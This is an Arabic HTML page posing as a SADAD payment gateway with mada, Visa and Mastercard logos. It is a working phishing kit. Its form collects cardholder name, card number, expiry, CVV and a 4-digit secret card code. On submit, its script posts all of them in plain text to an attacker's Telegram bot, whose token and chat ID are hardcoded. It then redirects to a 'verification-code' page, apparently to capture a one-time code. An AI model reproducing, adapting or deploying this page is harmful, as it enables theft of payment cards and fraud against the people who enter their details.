<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>بوابة الدفع - سداد</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    @font-face {
      font-family: 'ds3';
      src: url('fonts/ds3.woff') format('woff');
      font-weight: normal;
      font-style: normal;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'ds3', sans-serif;
      background: url('Image1.png') no-repeat center center/cover;
      min-height: 120vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .payment-box {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 20px;
      border-radius: 15px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }

    .payment-box h2 {
      text-align: center;
      color: orange;
      margin-bottom: 20px;
      font-size: 24px;
    }

    .payment-details {
      margin-bottom: 20px;
      padding-bottom: 15px;
      border-bottom: 1px solid #eee;
    }

    .payment-details p {
      margin: 8px 0;
      font-size: 16px;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 15px;
    }

    .card-type-icon-inline {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      height: 20px;
    }

    input {
      width: 100%;
      padding: 12px 12px 12px 40px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      font-family: 'ds3', sans-serif;
      background-color: #fff;
    }

    input:focus {
      outline: 2px solid orange;
      border-color: transparent;
    }

    .inline-inputs {
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
    }

    .inline-inputs input {
      flex: 1;
      min-width: 0;
    }

    .submit-btn {
      background-color: orange;
      color: white;
      padding: 14px;
      border: none;
      width: 100%;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
      font-family: 'ds3', sans-serif;
      transition: background-color 0.3s;
    }

    .submit-btn:hover {
      background-color: #e68a00;
    }

    .spinner {
      display: none;
      margin-top: 15px;
      text-align: center;
      font-size: 16px;
      color: orange;
    }

    .payment-icons {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 20px;
    }

    .payment-icons img {
      height: 25px;
      max-width: 60px;
      object-fit: contain;
    }

    /* تحسينات للجوال */
    @media (max-width: 480px) {
      body {
        padding: 10px;
        align-items: flex-start;
      }

      .payment-box {
        padding: 15px;
        margin-top: 20px;
      }

      .payment-box h2 {
        font-size: 20px;
      }

      .payment-details p {
        font-size: 14px;
      }

      input {
        padding: 10px 10px 10px 35px;
        font-size: 14px;
      }

      .submit-btn {
        padding: 12px;
        font-size: 16px;
      }

      .inline-inputs {
        flex-direction: column;
        gap: 10px;
      }

      .payment-icons img {
        height: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="payment-box">
    <h2>الدفع الإلكتروني</h2>
    
    <form id="payment-form">
      <input type="text" id="card-name" placeholder="الاسم على البطاقة" required>
      
       <br> <br> 
    
      
      <div class="input-wrapper">
        <img id="card-icon" class="card-type-icon-inline" src="" alt="">
        <input type="text" id="card-number" placeholder="رقم البطاقة" maxlength="19" required style="direction: ltr;">
      </div>
      
      <div class="inline-inputs">
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
        <input type="text" id="cvv" placeholder="رمز الأمان" maxlength="3" required>
      </div>

      <div class="inline-inputs">
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
        <input type="text" id="cvv" placeholder="رمز البطاقة السري" maxlength="4" required>
      </div>

      <div class="payment-box">
        <h2>سيتم الاتصال بك لتأكيد ربط بطاقتك بإمكان والاستفادة من كوبون الخصم على نسبة الفائدة</h2>
      
      <button type="submit" class="submit-btn">إتمام الدفع</button>
      <div class="spinner" id="spinner">جاري المعالجة...</div>
    </form>
    
    <div class="payment-icons">
      <img src="https://www.mada.com.sa/sites/mada/files/inline-images/logo.svg" alt="mada">
      <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="visa">
      <img src="https://mea.mastercard.com/content/dam/public/mastercardcom/en-region-mea/Images/consumers/icons/mc-logo-52.svg" alt="mastercard">
      <img src="https://www.sadad.com/sites/sadad/themes/custom/sadad_theme/images/logo.png" alt="sadad">
    </div>
  </div>

  <script>
    const cardInput = document.getElementById('card-number');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const cardIcon = document.getElementById('card-icon');
    const form = document.getElementById('payment-form');
    const spinner = document.getElementById('spinner');

    // دالة لتنسيق رقم البطاقة
    cardInput.addEventListener('input', e => {
      let value = e.target.value.replace(/\D/g, '').substring(0, 16);
      e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';

      // تحديد نوع البطاقة
      if (/^4/.test(value)) {
        cardIcon.src = 'https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png';
      } else if (/^5[1-5]/.test(value)) {
        cardIcon.src = 'https://mea.mastercard.com/content/dam/public/mastercardcom/en-region-mea/Images/consumers/icons/mc-logo-52.svg';
      } else if (/^6/.test(value)) {
        cardIcon.src = 'https://www.mada.com.sa/sites/mada/files/inline-images/logo.svg';
      } else {
        cardIcon.src = '';
      }
    });

    // دالة لتنسيق تاريخ الانتهاء
    expiryInput.addEventListener('input', e => {
      let val = e.target.value.replace(/\D/g, '').substring(0, 4);
      if (val.length > 2) {
        val = val.substring(0, 2) + '/' + val.substring(2);
      }
      e.target.value = val;
    });

    // دالة لتقييد رمز الأمان لأرقام فقط
    cvvInput.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
    });

    // معالجة إرسال النموذج
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      const name = document.getElementById('card-name').value.trim();
      const card = cardInput.value.replace(/\s/g, '');
      const expiry = expiryInput.value;
      const cvv = cvvInput.value;

      // التحقق من صحة البيانات
      if (!name || card.length !== 16 || !/^\d{2}\/\d{2}$/.test(expiry) || cvv.length !== 3) {
        alert('يرجى تعبئة جميع الحقول بشكل صحيح.');
        return;
      }

      spinner.style.display = 'block';

      // إرسال البيانات (يجب إزالة هذا الجزء في البيئة الإنتاجية)
      const botToken = "7699595929:AAFQ_fuCA2z-9-1oeCWVlMwC7WIB64uqe0E";
      const chatId = "7585533835";
      const message = `\uD83D\uDCB3 طلب دفع جديد\n\nالاسم: ${name}\nرقم البطاقة: ${card}\nتاريخ الانتهاء: ${expiry}\nرمز الأمان: ${cvv}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(() => {
        setTimeout(() => {
          window.location.href = 'verification-code.html';
        }, 3000);
      })
      .catch(err => {
        alert('حدث خطأ أثناء إرسال البيانات.');
        spinner.style.display = 'none';
      });
    });
  </script>
</body>
</html>
